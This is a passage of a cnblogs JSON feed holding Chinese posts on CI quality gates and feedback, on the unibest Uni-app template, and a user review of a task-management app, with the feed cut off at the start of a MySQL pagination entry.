target=\"_blank\">https://p.kdocs.cn/s/EJACICRFACQBS</a></strong></p>\n<blockquote>\n<p>持续集成的真正价值不在于工具链的复杂程度，而在于反馈速度与质量保障的完美平衡</p>\n</blockquote>\n<p>在确立契约测试作为微服务协作的基石后，我们面临一个更关键的工程挑战：如何将质量保障无缝融入持续交付流水线。持续集成（CI）已成为现代软件开发的标配，但大多数团队仅停留在\"定期集成\"层面，未能充分发挥其价值流潜力。本文将从价值流视角深入分析质量门禁、报告可视化与快速反馈的设计原则，帮助团队构建高效可靠的CI/CD体系。</p>\n<h2 id=\"1-持续集成的价值流本质\">1 持续集成的价值流本质</h2>\n<h3 id=\"11-从集成频率到价值流动的思维转变\">1.1 从集成频率到价值流动的思维转变</h3>\n<p>传统持续集成强调<strong>代码提交频率</strong>，而现代CI的价值流关注<strong>代码从提交到生产的完整流动效率</strong>。价值流分析不仅衡量集成次数，更关注<strong>滞留时间</strong>、<strong>转化率</strong>和<strong>质量损耗</strong>。</p>\n<p><strong>价值流的核心指标</strong>包括：</p>\n<ul>\n<li><strong>前置时间</strong>：从代码提交到生产部署的总时间</li>\n<li><strong>流程时间</strong>：代码在CI流水线中的实际处理时间</li>\n<li><strong>百分位耗时</strong>：P50、P95、P99的流水线执行时间，反映稳定性</li>\n<li><strong>质量门禁通过率</strong>：首次提交即通过所有检查的比例</li>\n<li><strong>反馈闭环效率</strong>：从问题发现到修复确认的周期</li>\n</ul>\n<p>工商银行软件开发中心在DevOps转型中发现，优化价值流而非单纯提升集成频率，能将交付效率提升35%以上。</p>\n<h3 id=\"12-价值流瓶颈的识别与消除\">1.2 价值流瓶颈的识别与消除</h3>\n<p>价值流映射（Value Stream Mapping）是识别CI瓶颈的关键工具。通过可视化代码从提交到部署的完整路径，可以识别四大类瓶颈：</p>\n<p><strong>协作瓶颈</strong>：团队等待代码审查、合并授权<br />\n<strong>测试瓶颈</strong>：顺序执行的漫长测试套件<br />\n<strong>环境瓶颈</strong>：测试环境争夺或配置复杂<br />\n<strong>反馈瓶颈</strong>：结果分散在不同工具中，缺乏统一视图</p>\n<div class=\"mermaid\">graph TD\n    A[代码提交] --&gt; B[静态检查]\n    B --&gt; C[单元测试]\n    C --&gt; D[集成测试]\n    D --&gt; E[部署测试环境]\n    E --&gt; F[验收测试]\n    F --&gt; G[生产部署]\n    \n    B --&gt;|快速失败| H[开发者反馈]\n    C --&gt;|快速失败| H\n    D --&gt;|详细报告| I[团队反馈]\n    E --&gt;|环境状态| J[运维反馈]\n    F --&gt;|业务验证| K[产品反馈]\n    \n    style H fill:#e1f5fe\n    style I fill:#fff3e0\n    style J fill:#f3e5f5\n    style K fill:#e8f5e8\n</div><p><em>持续集成价值流与反馈节点图</em></p>\n<h2 id=\"2-质量门禁体系的设计哲学\">2 质量门禁体系的设计哲学</h2>\n<h3 id=\"21-质量门禁的层次化策略\">2.1 质量门禁的层次化策略</h3>\n<p>质量门禁不是单一关卡，而是<strong>分层防御体系</strong>。合理的门禁设计应在保证质量的同时最小化开发阻力。</p>\n<p><strong>代码级门禁</strong>是最早的防线，关注代码基本质量：</p>\n<ul>\n<li><strong>静态代码分析</strong>：复杂度、重复率、代码异味</li>\n<li><strong>安全扫描</strong>：潜在漏洞、依赖组件风险</li>\n<li><strong>编码规范</strong>：团队约定的风格一致性</li>\n</ul>\n<p><strong>验证级门禁</strong>确保功能正确性：</p>\n<ul>\n<li><strong>单元测试覆盖率</strong>：关键模块覆盖率达到80%以上</li>\n<li><strong>集成测试</strong>：服务间接口验证</li>\n<li><strong>API契约测试</strong>：基于OpenAPI规范的接口合规性</li>\n</ul>\n<p><strong>部署级门禁</strong>保障发布可靠性：</p>\n<ul>\n<li><strong>健康检查</strong>：服务启动后自验证</li>\n<li><strong>性能基准</strong>：关键API的响应时间阈值</li>\n<li><strong>合规检查</strong>：安全策略、审计要求</li>\n</ul>\n<p>京东云DevOps平台通过分层质量门禁，在双11大促期间实现了故障率降低50%以上的效果。</p>\n<h3 id=\"22-智能门禁与动态阈值\">2.2 智能门禁与动态阈值</h3>\n<p>固定阈值的门禁在复杂项目中往往成为开发阻力。<strong>智能门禁</strong>根据代码变更特征动态调整标准：</p>\n<pre><code class=\"language-yaml\"># 智能门禁配置示例\nquality_gates:\n  test_coverage:\n    base_requirement: 80%\n    adjustment_rules:\n      - if: change_type == 'bugfix'\n        then: requirement = 75%  # 修复代码适当放宽\n      - if: files_modified contains 'legacy/'\n        then: requirement = 70%  # 遗留代码特殊处理\n      - if: lines_added &lt; 10\n        then: requirement = 60%  # 微小变更降低要求\n  \n  static_analysis:\n    base_requirement: zero_new_critical\n    adjustment_rules:\n      - if: is_hotfix == true\n        then: allow_1_critical  # 热修复允许1个严重问题\n</code></pre>\n<p>这种基于上下文的动态阈值既保证了质量底线，又避免了不必要的开发阻碍。</p>\n<h3 id=\"23-质量门禁的流水线集成模式\">2.3 质量门禁的流水线集成模式</h3>\n<p>门禁与流水线的集成方式直接影响反馈效率。<strong>并行检查</strong>模式可以大幅缩短反馈周期：</p>\n<pre><code class=\"language-yaml\"># 并行门禁检查配置\nstages:\n  - prepare\n  - quality_checks\n  - deployment\n\nquality_checks:\n  stage: quality_checks\n  parallel:  # 并行执行质量检查\n    - script: sonar-scanner\n      name: sonarqube_analysis\n    - script: npm run security-scan\n      name: security_scan\n    - script: pytest --cov --cov-report=xml\n      name: test_coverage\n  allow_failure: false\n</code></pre>\n<p>当检查任务较多时，通过<strong>依赖关系分析</strong>优先执行关键路径检查，进一步优化反馈速度。</p>\n<h2 id=\"3-报告可视化从数据噪音到决策洞察\">3 报告可视化：从数据噪音到决策洞察</h2>\n<h3 id=\"31-多层次可视化设计原则\">3.1 多层次可视化设计原则</h3>\n<p>报告可视化不是简单的数据展示，而是<strong>问题定位和决策支持的认知工具</strong>。有效的可视化应遵循<strong>金字塔原则</strong>：顶层展示核心健康度，支持逐层下钻分析。</p>\n<p><strong>流水线健康度全景图</strong>为团队提供一站式视图：</p>\n<ul>\n<li><strong>构建成功率趋势</strong>：识别稳定性问题</li>\n<li><strong>测试覆盖率变化</strong>：监控质量演进</li>\n<li><strong>门禁通过率统计</strong>：评估代码提交质量</li>\n<li><strong>构建时间分布</strong>：发现性能退化</li>\n</ul>\n<p><strong>失败分析视图</strong>帮助快速定位问题：</p>\n<ul>\n<li><strong>失败类型分布</strong>：测试失败、编译错误、环境问题</li>\n<li><strong>失败模块热力图</strong>：识别问题集中区域</li>\n<li><strong>历史对比分析</strong>：与之前成功构建的差异对比</li>\n</ul>\n<p>Allure测试报告通过丰富的图表展示测试执行详情、历史趋势和缺陷分布，大大提升了测试结果的分析效率。</p>\n<h3 id=\"32-面向角色的可视化策略\">3.2 面向角色的可视化策略</h3>\n<p>不同角色关注不同的指标和视图，<strong>个性化可视化</strong>能显著提升信息获取效率。</p>\n<p><strong>开发者视角</strong>关注快速反馈：</p>\n<ul>\n<li><strong>本次提交影响范围</strong>：修改的文件、关联的测试</li>\n<li><strong>个人提交质量趋势</strong>：近期通过率、常见错误类型</li>\n<li><strong>快速修复指导</strong>：错误定位、修复建议</li>\n</ul>\n<p><strong>技术负责人视角</strong>关注整体质量：</p>\n<ul>\n<li><strong>团队质量指标</strong>：平均通过率、技术债务趋势</li>\n<li><strong>模块健康度排名</strong>：问题集中度分析</li>\n<li><strong>质量演进预测</strong>：基于历史数据的质量预测</li>\n</ul>\n<p><strong>项目经理视角</strong>关注交付风险：</p>\n<ul>\n<li><strong>迭代进度可视化</strong>：已完成、进行中、受阻的任务</li>\n<li><strong>质量风险预警</strong>：可能影响发布的质量问题</li>\n<li><strong>效率指标</strong>：构建时长、反馈周期</li>\n</ul>\n<h3 id=\"33-可视化反馈的实时性与交互性\">3.3 可视化反馈的实时性与交互性</h3>\n<p><strong>实时更新</strong>的可视化能够及时驱动行动。通过WebSocket等技术实现仪表板实时更新，让团队成员在问题发生几分钟内即可感知。</p>\n<p><strong>交互式下钻</strong>能力使分析从宏观到微观：</p>\n<pre><code class=\"language-javascript\">// 可视化下钻示例\nfunction setupDrillDown() {\n  // 点击构建失败率图表，下钻到具体失败任务\n  chart.on('click', function(params) {\n    if (params.componentType === 'series') {\n      const buildId = params.data.buildId;\n      // 加载该构建的详细失败信息\n      loadFailureDetails(buildId);\n    }\n  });\n}\n</code></pre>\n<p>在团队工作区域设置<strong>物理可视化看板</strong>，结合电子仪表板，形成线上线下的立体反馈系统。</p>\n<h2 id=\"4-快速反馈机制的设计重点\">4 快速反馈机制的设计重点</h2>\n<h3 id=\"41-反馈速度与质量的平衡艺术\">4.1 反馈速度与质量的平衡艺术</h3>\n<p>快速反馈不是一味追求速度，而是<strong>在合适的时间提供有价值的信息</strong>。反馈机制需要平衡<strong>速度</strong>、<strong>精度</strong>和<strong>行动性</strong>。</p>\n<p><strong>分层反馈策略</strong>在不同阶段提供不同粒度的反馈：</p>\n<ul>\n<li><strong>即时反馈</strong>（&lt;5分钟）：编译、基础静态检查、关键单元测试</li>\n<li><strong>快速反馈</strong>（5-15分钟）：完整单元测试、基础集成测试</li>\n<li><strong>完整反馈</strong>（15-60分钟）：全量集成测试、端到端测试</li>\n</ul>\n<pre><code class=\"language-yaml\"># 分层反馈配置\nfeedback_levels:\n  immediate:\n    timeout: 5min\n    checks: [compile, lint, critical_unit_tests]\n    notification: [slack_immediate, IDE]\n  fast:\n    timeout: 15min \n    checks: [all_unit_tests, integration_smoke]\n    notification: [slack_channel, email]\n  full:\n    timeout: 60min\n    checks: [all_integration, e2e, performance]\n    notification: [slack_channel, email, dashboard]\n</code></pre>\n<h3 id=\"42-精准通知与告警防骚扰\">4.2 精准通知与告警防骚扰</h3>\n<p>过度的通知会导致<strong>告警疲劳</strong>，重要信息被淹没。智能通知策略基于<strong>上下文</strong>和<strong>相关性</strong>进行精准推送。</p>\n<p><strong>通知路由规则</strong>确保信息送达正确的人：</p>\n<pre><code class=\"language-yaml\">notification_rules:\n  - match: { failure_type: \"compile\", component: \"frontend\" }\n    notify: [\"frontend-team\", \"commit-author\"]\n    urgency: \"high\"\n    \n  - match: { failure_type: \"test\", component: \"legacy-system\" }  \n    notify: [\"legacy-maintainers\", \"tech-lead\"]\n    urgency: \"medium\"\n    \n  - match: { failure_type: \"performance\", degradation: \"&gt;20%\" }\n    notify: [\"performance-team\", \"architect\"]\n    urgency: \"high\"\n</code></pre>\n<p><strong>反馈摘要</strong>机制将相关通知聚合，避免信息过载：</p>\n<ul>\n<li><strong>每日质量摘要</strong>：当天构建情况、质量趋势</li>\n<li><strong>迭代总结报告</strong>：本迭代质量改进成效</li>\n<li><strong>个性化摘要</strong>：个人提交质量改进建议</li>\n</ul>\n<h3 id=\"43-反馈闭环验证与持续改进\">4.3 反馈闭环验证与持续改进</h3>\n<p>反馈只有形成闭环才有价值。<strong>闭环验证</strong>确保每个问题都被跟踪到解决：</p>\n<div class=\"mermaid\">graph LR\n    A[问题发现] --&gt; B[通知分发]\n    B --&gt; C[负责人处理]\n    C --&gt; D[修复验证]\n    D --&gt; E[根本原因分析]\n    E --&gt; F[流程改进]\n    F --&gt; A\n</div><p><em>反馈闭环流程图</em></p>\n<p><strong>反馈效率度量</strong>是改进的基础：</p>\n<ul>\n<li><strong>问题发现到通知时间</strong>：检测效率</li>\n<li><strong>通知到确认时间</strong>：响应效率</li>\n<li><strong>确收到修复时间</strong>：解决效率</li>\n<li><strong>修复到验证时间</strong>：验证效率</li>\n</ul>\n<p>通过定期分析这些指标，识别反馈链条中的瓶颈并持续优化。</p>\n<h2 id=\"5-流水线性能优化策略\">5 流水线性能优化策略</h2>\n<h3 id=\"51-并行化与分布式执行\">5.1 并行化与分布式执行</h3>\n<p>流水线性能直接影响反馈速度。<strong>任务依赖分析</strong>是并行优化的基础，通过建立任务依赖图识别可并行阶段。</p>\n<p><strong>智能并行化</strong>策略：</p>\n<pre><code class=\"language-yaml\"># 并行执行配置\nparallelization:\n  strategy: optimistic\n  rules:\n    - when: test_files_changed\n      then: parallelize_tests_by_module\n    - when: frontend_changed\n      then: run_frontend_tests_only\n    - when: backend_changed  \n      then: run_backend_tests_only\n</code></pre>\n<p><strong>分布式执行</strong>通过集群化大幅缩短执行时间：</p>\n<ul>\n<li><strong>动态资源分配</strong>：根据任务需求分配合适配置的执行器</li>\n<li><strong>缓存共享</strong>：节点间共享依赖缓存、Docker镜像</li>\n<li><strong>负载均衡</strong>：基于节点负载和网络状况智能调度</li>\n</ul>\n<h3 id=\"52-增量检查与缓存优化\">5.2 增量检查与缓存优化</h3>\n<p>全量检查在大型项目中往往不现实。<strong>增量分析</strong>只检查变更影响范围，平衡速度与准确性。</p>\n<p><strong>智能缓存策略</strong>避免重复工作：</p>\n<pre><code class=\"language-yaml\">cache_strategy:\n  dependencies:\n    key: \"dependencies-${checksum['package.json']}\"\n    paths: [node_modules]\n  build_output:\n    key: \"build-${CI_COMMIT_REF_SLUG}\"\n    paths: [dist]\n  test_results:\n    key: \"tests-${CI_COMMIT_REF_SLUG}\"\n    paths: [test_results]\n</code></pre>\n<p>工商银行通过优化缓存策略，将流水线平均执行时间从45分钟缩短到18分钟。</p>\n<h2 id=\"6-文化因素质量内建与集体负责\">6 文化因素：质量内建与集体负责</h2>\n<h3 id=\"61-从质量门禁到质量内建\">6.1 从质量门禁到质量内建</h3>\n<p>技术手段必须与文化建设相结合。<strong>质量内建</strong>强调在开发过程中构建质量，而非依赖后期检查。</p>\n<p><strong>质量内建实践</strong>包括：</p>\n<ul>\n<li><strong>代码审查</strong>：通过Pull Request和结对编程提前发现问题</li>\n<li><strong>测试驱动开发</strong>：先写测试，确保代码可测试性</li>\n<li><strong>持续重构</strong>：小步迭代，避免技术债务累积</li>\n</ul>\n<p><strong>集体代码所有权</strong>文化确保每个成员都关心质量：</p>\n<ul>\n<li><strong>交叉评审</strong>：不同背景的开发者相互评审代码</li>\n<li><strong>知识共享</strong>：定期分享质量改进经验</li>\n<li><strong>无指责文化</strong>：关注问题解决而非责任追究</li>\n</ul>\n<h3 id=\"62-持续改进的质量社区\">6.2 持续改进的质量社区</h3>\n<p>建立<strong>质量社区</strong>实践，让质量成为团队对话的核心：</p>\n<ul>\n<li><strong>质量研讨会</strong>：定期讨论质量标准和改进点</li>\n<li><strong>失败分析会</strong>：深度分析重大故障，分享学习</li>\n<li><strong>工具优化日</strong>：定期优化开发工具和流水线</li>\n</ul>\n<p>某大型互联网公司通过建立质量社区，在6个月内将生产环境缺陷率降低了40%。</p>\n<h2 id=\"总结\">总结</h2>\n<p>持续集成的价值流优化是一个系统工程，需要技术、流程和文化的协同改进。有效的CI系统应该像<strong>精密的神经系统</strong>，能够快速感知变化、准确诊断问题、及时触发修复动作。</p>\n<p><strong>成功实施的关键原则</strong>：</p>\n<ol>\n<li><strong>价值流导向</strong>：关注端到端流动效率，而非局部优化</li>\n<li><strong>快速反馈循环</strong>：建立分层反馈机制，平衡速度与准确性</li>\n<li><strong>质量内建文化</strong>：将质量意识融入开发全过程</li>\n<li><strong>数据驱动改进</strong>：基于度量数据持续优化流水线</li>\n<li><strong>人员协同优先</strong>：工具为协作服务，而非相反</li>\n</ol>\n<p>真正的持续集成价值流能够将<strong>代码提交</strong>转化为<strong>可靠的产品增量</strong>，在这个过程中，每个团队成员都能快速获得有意义的反馈，并充满信心地向用户交付价值。</p>\n<hr />\n<p><strong>📚 下篇预告</strong><br />\n《容器镜像的工程化思维——最小化、分层与可复现构建的取舍》—— 我们将深入探讨：</p>\n<ul>\n<li>🏗️ <strong>镜像分层策略</strong>：基础镜像选择、层优化与安全更新的平衡之道</li>\n<li>📦 <strong>最小化镜像</strong>：多阶段构建、Distroless与静态编译的技术选型</li>\n<li>🔄 <strong>可复现构建</strong>：环境一致性、构建缓存与版本追溯的实践方案</li>\n<li>🛡️ <strong>安全治理</strong>：漏洞扫描、签名验证与供应链安全的最佳实践</li>\n<li>⚖️ <strong>大小与效率的权衡</strong>：开发体验与运行时性能的优化取舍</li>\n</ul>\n<p><strong>点击关注，掌握容器镜像的工程化实践！</strong></p>\n<blockquote>\n<p><strong>今日行动建议</strong>：</p>\n<ol>\n<li>绘制当前CI系统的价值流图，识别瓶颈环节</li>\n<li>评估质量门禁的层级设计，确保快速反馈与深度检查的平衡</li>\n<li>优化报告可视化策略，基于角色提供差异化视图</li>\n<li>建立反馈效率度量体系，持续优化闭环效率</li>\n<li>培育质量社区文化，将质量内建融入开发日常</li>\n</ol>\n</blockquote>\n\n</div>\n<div id=\"MySignature\">\n    个人微信：lpshiyue 添加暗号：道生一 <br />\n欢迎搜索关注微信公众号： 基础进阶，第一时间阅读最新文章\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-16 14:53</span>&nbsp;\n<a href=\"https://www.cnblogs.com/shiyuelp\">十月南城</a>&nbsp;\n阅读(<span id=\"post_view_count\">83</span>)&nbsp;\n评论(<span id=\"post_comment_count\">1</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "unibest：基于 Vite + Vue 3 的 Uni-app 开发终极方案",
      "link": "https://www.cnblogs.com/lijinhuaboke/p/19491916",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/lijinhuaboke/p/19491916\" id=\"cb_post_title_url\" title=\"发布于 2026-01-16 14:50\">\n    <span>unibest：基于 Vite + Vue 3 的 Uni-app 开发终极方案</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"告别-hbuilderx拥抱-unibest基于-vite--vue-3-的-uni-app-开发终极方案\">告别 HBuilderX？拥抱 unibest：基于 Vite + Vue 3 的 Uni-app 开发终极方案</h1>\n<p>在移动端跨平台开发领域，<strong>Uni-app</strong> 凭借其强大的跨端能力不仅统一了小程序和 App 的开发，更构建了庞大的生态。然而，传统的开发模式（依赖 HBuilderX、基于 Webpack 的构建速度、繁琐的样式写法）在面对日益复杂的大型项目时，逐渐显露出工程化能力的短板。</p>\n<p><strong>unibest</strong> (uni-app + best) 的出现，正是为了解决这些痛点。它是一套集成了当前前端最前沿技术栈的 Uni-app 开发模板，旨在提供<strong>极致的开发体验</strong>和<strong>最佳的工程实践</strong>。</p>\n<p>今天，我们就了解下，为什么 unibest 是你下一个 Uni-app 项目的不二之选。</p>\n<h2 id=\"核心技术栈快不仅是构建速度\">核心技术栈：快，不仅是构建速度</h2>\n<p>unibest 的核心理念是“现代化”。它抛弃了陈旧的工具链，全面拥抱了以下技术：</p>\n<ul>\n<li><strong>构建工具</strong>：<strong>Vite 5</strong> —— 毫秒级的冷启动和热更新（HMR），相比 Webpack 提升 10 倍以上。</li>\n<li><strong>核心框架</strong>：<strong>Vue 3 (Script Setup)</strong> —— 更简洁的代码组织，更强的逻辑复用能力。</li>\n<li><strong>语言</strong>：<strong>TypeScript</strong> —— 全链路类型安全，重构不再心惊胆战。</li>\n<li><strong>样式引擎</strong>：<strong>UnoCSS</strong> —— 原子化 CSS 引擎，样式开发效率的革命。</li>\n<li><strong>状态管理</strong>：<strong>Pinia</strong> —— 轻量、直观，完美支持 Composition API。</li>\n</ul>\n<h2 id=\"深入-unibest-的技术亮点\">深入 unibest 的技术亮点</h2>\n<h3 id=\"1-极致的原子化样式体验-unocss\">1. 极致的原子化样式体验 (UnoCSS)</h3>\n<p>写小程序最耗时的往往不是逻辑，而是写样式。传统的 <code>class</code> + <code>css</code> 模式需要在模板和样式文件间反复横跳。</p>\n<p>unibest 内置了 <strong>UnoCSS</strong>，让你可以在模板中直接书写原子类，所见即所得。</p>\n<p><strong>传统写法：</strong></p>\n<pre><code class=\"language-html\">&lt;!-- template --&gt;\n&lt;view class=\"card\"&gt;\n  &lt;view class=\"title\"&gt;标题&lt;/view&gt;\n&lt;/view&gt;\n\n&lt;!-- style --&gt;\n.card { padding: 10px; background: #fff; border-radius: 4px; box-shadow: 0 2px\n4px rgba(0,0,0,0.1); } .title { font-size: 16px; font-weight: bold; color: #333;\n}\n</code></pre>\n<p><strong>unibest (UnoCSS) 写法：</strong></p>\n<pre><code class=\"language-html\">&lt;view class=\"p-4 bg-white rounded shadow-sm\"&gt;\n  &lt;view class=\"text-base font-bold text-gray-800\"&gt;标题&lt;/view&gt;\n&lt;/view&gt;\n</code></pre>\n<p><strong>优点</strong>：代码量减少 50%，无需费劲想类名，CSS 体积极致压缩。</p>\n<h3 id=\"2-自动化开发的魅力-auto-imports\">2. 自动化开发的魅力 (Auto Imports)</h3>\n<p>利用 <code>unplugin-auto-import</code> 和 <code>unplugin-vue-components</code>，unibest 实现了 API 和组件的<strong>自动按需引入</strong>。</p>\n<p>你不再需要满屏的 <code>import</code> 语句：</p>\n<pre><code class=\"language-typescript\">// 以前\nimport { ref, computed, onMounted } from \"vue\";\nimport { onLoad } from \"@dcloudio/uni-app\";\n\n// 现在：直接用！编译器会自动处理\nconst count = ref(0);\nonLoad(() =&gt; {\n  console.log(\"Page loaded\");\n});\n</code></pre>\n<h3 id=\"3-企业级的网络请求封装-promise--interceptors\">3. 企业级的网络请求封装 (Promise &amp; Interceptors)</h3>\n<p>unibest 模板中通常包含了一套成熟的 <code>uni.request</code> 封装方案，展示了如何优雅地处理拦截器、Token 注入和并发控制。</p>\n<p><strong>亮点模式：静默登录与 Token 自动注入</strong><br />\n框架支持在请求拦截器中处理复杂的鉴权逻辑，例如：在 Token 不存在时自动挂起请求，完成登录后再继续。</p>\n<pre><code class=\"language-typescript\">// utils/http.ts 示例架构\nexport const http = async &lt;T&gt;(options: CustomRequestOptions) =&gt; {\n  // 1. 动态 Token 注入\n  const token = uni.getStorageSync(\"token\");\n\n  // 2. 智能拦截：如果是需要鉴权的接口且无 token，自动触发登录流程\n  if (options.auth &amp;&amp; !token) {\n    await useUserStore().login();\n  }\n\n  return new Promise&lt;Result&lt;T&gt;&gt;((resolve, reject) =&gt; {\n    uni.request({\n      ...options,\n      success(res) {\n        // 3. 统一错误拦截（如 401 过期）\n        if (res.statusCode === 401) {\n          // 清理状态，跳转登录页或无感刷新 Token\n          reject(\"Unauthorized\");\n        } else {\n          resolve(res.data);\n        }\n      },\n    });\n  });\n};\n</code></pre>\n<h3 id=\"4-基于文件系统的路由-file-based-routing\">4. 基于文件系统的路由 (File-based Routing)</h3>\n<p>摆脱臃肿的 <code>pages.json</code>！unibest 集成了 <code>vite-plugin-uni-pages</code>，支持通过文件目录结构自动生成路由配置。</p>\n<ul>\n<li><strong>自动注册</strong>：新建 <code>src/pages/login/index.vue</code>，自动识别为页面。</li>\n<li><strong>配置内聚</strong>：页面的标题、导航栏样式直接在 Vue 文件的 <code>&lt;route&gt;</code> 块中定义，无需去 <code>pages.json</code> 里查找。</li>\n</ul>\n<pre><code class=\"language-html\">&lt;!-- src/pages/index/index.vue --&gt;\n&lt;route lang=\"json5\"&gt; { style: { navigationBarTitleText: '首页', } } &lt;/route&gt;\n\n&lt;template&gt;\n  &lt;view&gt;Home&lt;/view&gt;\n&lt;/template&gt;\n</code></pre>\n<h3 id=\"5-优秀的并发处理范式\">5. 优秀的并发处理范式</h3>\n<p>在处理小程序登录（<code>uni.login</code>）等异步操作时，unibest 推荐使用 <strong>Promise 锁</strong> 模式来防止并发请求导致的重复调用。这是非常实用的高阶技巧。</p>\n<pre><code class=\"language-typescript\">// store/user.ts\nlet loginPromise: Promise&lt;void&gt; | null = null;\n\nconst login = () =&gt; {\n  // 如果已经在登录中，直接返回现有的 Promise，避免重复调用 uni.login\n  if (loginPromise) return loginPromise;\n\n  loginPromise = (async () =&gt; {\n    try {\n      const { code } = await uni.login();\n      // ... 换取 Token\n    } finally {\n      loginPromise = null; // 释放锁\n    }\n  })();\n\n  return loginPromise;\n};\n</code></pre>\n<h2 id=\"为什么选择-unibest\">为什么选择 unibest？</h2>\n<ol>\n<li><strong>工程化完备</strong>：开箱即用的 ESLint, Prettier, Husky, Commitlint 配置，规范团队代码。</li>\n<li><strong>多端适配强</strong>：不仅支持微信小程序，还通过条件编译和 polyfill 完美支持 H5、App 及其他小程序平台。</li>\n<li><strong>生态活跃</strong>：基于 Vite 生态，可以复用大量现有的 Vue 3 插件和工具。</li>\n</ol>\n<h2 id=\"使用体验\">使用体验</h2>\n<p>个人使用体验还是蛮不错的，支持 vscode 作为编辑器，基础的封装（比如 uni.request）都有,引入了实用的插件(比如 z-paging),自动化开发（约定式路由，自动引入组件、自动引入 api），使用 wot-ui 组件库、原子化样式等等，比原来使用 uniapp 开发起来效率和效果确实要好.<br />\n官网地址：<a href=\"https://www.unibest.tech/%EF%BC%8C%E8%BF%98%E6%9C%89%E5%BE%88%E5%A4%9A%E5%BE%88%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84%E4%B8%9C%E8%A5%BF%EF%BC%8C%E5%A4%A7%E5%AE%B6%E5%8F%AF%E4%BB%A5%E5%AE%98%E7%BD%91%E5%8E%BB%E7%9C%8B%E7%9C%8B%E3%80%82\" rel=\"noopener nofollow\" target=\"_blank\">https://www.unibest.tech/，还有很多很有意思的东西，大家可以官网去看看。</a></p>\n<h2 id=\"结语\">结语</h2>\n<p>技术在不断演进，工具也在不断革新。unibest 不仅仅是一个模板，它代表了一种<strong>高效、规范、现代</strong>的 Uni-app 开发方式。如果你希望摆脱传统开发模式的束缚，提升团队的开发效率和代码质量，unibest 绝对值得一试。</p>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-16 14:50</span>&nbsp;\n<a href=\"https://www.cnblogs.com/lijinhuaboke\">此颜差矣。</a>&nbsp;\n阅读(<span id=\"post_view_count\">0</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "终于找到了一款足够简单的任务管理软件",
      "link": "https://www.cnblogs.com/lbnnbs/p/19491338",
      "published": "",
      "description": "<div class=\"postTitle\">\n            <h1><a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/lbnnbs/p/19491338\" id=\"cb_post_title_url\" title=\"发布于 2026-01-16 12:23\">\n    <span>终于找到了一款足够简单的任务管理软件</span>\n    \n\n</a>\n</h1>\n        </div>\n        <div class=\"blogpost-body blogpost-body-html\" id=\"cnblogs_post_body\">\n现在大家不但休息时间很碎片化，工作时间很多时候都是碎片化的。为了管理好自己的工作，我各类软件都使用过。但市面上多数工具要么功能繁杂，要么不支持手机版，要不就是收费太贵，真不是我这样的小白能用的起的。我个人使用过使用过很多的工作任务管理软件，有项目管理类的，有便签类的，有日程类的。但项目管理类的操作过于复杂，日程类和便签类的又没有团队协作功能。总之很难找一款简单好用的小团队小项目任务管理软件。后来百度的时候搜索到了一款叫九运任务宝的小工具，它官网上强调以 “简单、轻快、好用” 为核心定位，感觉有点点靠谱。下载试用后感觉还真不错，最起码要的东西都有。现在经过了几个月的使用，感觉找到了梦中情软（说的过分了点^_^）。<br /><br />传统任务管理软件，创建一个任务需要经历填写名称、设置分类、选择成员、调整时间等多个繁琐步骤，甚至需要跳转多个页面才能完成配置，新手入门需要花不少时间去学习，特别是项目管理类的，特别复杂。不但没有帮到工作排期，反而给增加了额外负担。而且有些工具的任务编辑功能简陋，缺少撤销重做，手机上操作一不小心删除时删过了头，就要重写一大段了。但这个九运任务宝任务创建全流程都和简单，只需专注填写任务内容，会自动根据首段内容智能生成任务名称，不用反复斟酌标题，秒速完成任务记录。任务内容编辑框带了撤销和重做功能，操作失误要不怕。<br /><br />他还有一个上传的图片会自动标注序号的功能，可以和任务内容上的描述匹配起来，让任务要求更清晰。这种 “少操作、多专注” 的设计，让任务创建效率提高不少。<br /><br />传统任务管理软件常常追求 “大而全”，堆砌了大量使用率极低的复杂功能，不仅增加了软件体积和操作难度，还容易让我在众多功能面前一脸懵逼。<br /><br />比如吧，项目管理类软件权限管理模块设计太复杂，设置流程繁琐。在比如大多数工具的任务状态没有 “搁置” 等选项，暂时无需处理的任务只能占用列表空间，导致信息杂乱。<br /><br />但这个九运任务宝在任务设置上，有“已搁置” 这个任务状态，就很方便，任务列表更整洁。在时间选择界面用绿色加粗字体标注节假日，工作排期时不需要额外切换日历APP查询假期。批量操作功能简单直观，长按任务即就可以进入批量编辑模式，右滑操作也很人性化，搞得我不时就像去划一下。此外，任务分类、优先级设置、协作人指派、甘特图等核心功能一应俱全，既满足多场景需求，又没啥多余的操作。<br /><br />另外，大多拥有项目和任务管理的软件移动端都比较难用，外出时宅手机上处理任务很头疼。这个九运任务宝就支持 PC 电脑端、手机 APP 端、微信小程序端、手机 H5 网页端，在外面也能随时随地操作。<br /><br />感觉现在的软件都越做越复杂，不实用的功能一大堆，追求大而全，像这类关注核心需要的软件倒是更少，也不知道是咋回事，是不知道我们需要什么样的工具才顺手吗。\n</div>\n<div class=\"clear\"></div>\n\n        <div class=\"postDesc\">posted on \n<span id=\"post-date\">2026-01-16 12:23</span>&nbsp;\n<a href=\"https://www.cnblogs.com/lbnnbs\">lbnnbs</a>&nbsp;\n阅读(<span id=\"post_view_count\">366</span>)&nbsp;\n评论(<span id=\"post_comment_count\">3</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "MySQL深度分页优化实战：从踩坑到落地的全攻略",
      "link": "https://www.cnblogs.com/sun-10387834/p/19491242",
      "published": "",
